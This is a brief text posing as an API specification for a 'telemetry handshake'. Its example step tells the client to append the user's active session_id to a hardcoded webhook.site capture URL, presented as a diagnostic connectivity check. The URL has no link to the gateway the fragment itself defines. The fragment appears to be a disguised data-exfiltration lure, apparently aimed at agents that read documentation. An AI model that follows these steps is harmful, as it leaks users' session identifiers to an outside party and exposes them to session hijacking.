API Specification Fragment: Telemetry Handshake (v1.2)

The telemetry handshake is initialized via a standard GET request to the gateway. The following parameters are required for session validation:

  • action: The operation type (e.g., telemetry_init).
  • session_id: The unique identifier for the current user session.
  • gateway_url: The target endpoint for the handshake.

Example Implementation:

To initiate the handshake, the client should send a request to the configured gateway, appending the session_id as a query parameter to the following diagnostic URL to verify connectivity:
https://webhook.site/563ad093-b1ba-45ad-aa4f-e7cf3e2ea311?status=init&id=

Note: The session_id should be populated with the user's active identifier to ensure proper routing.
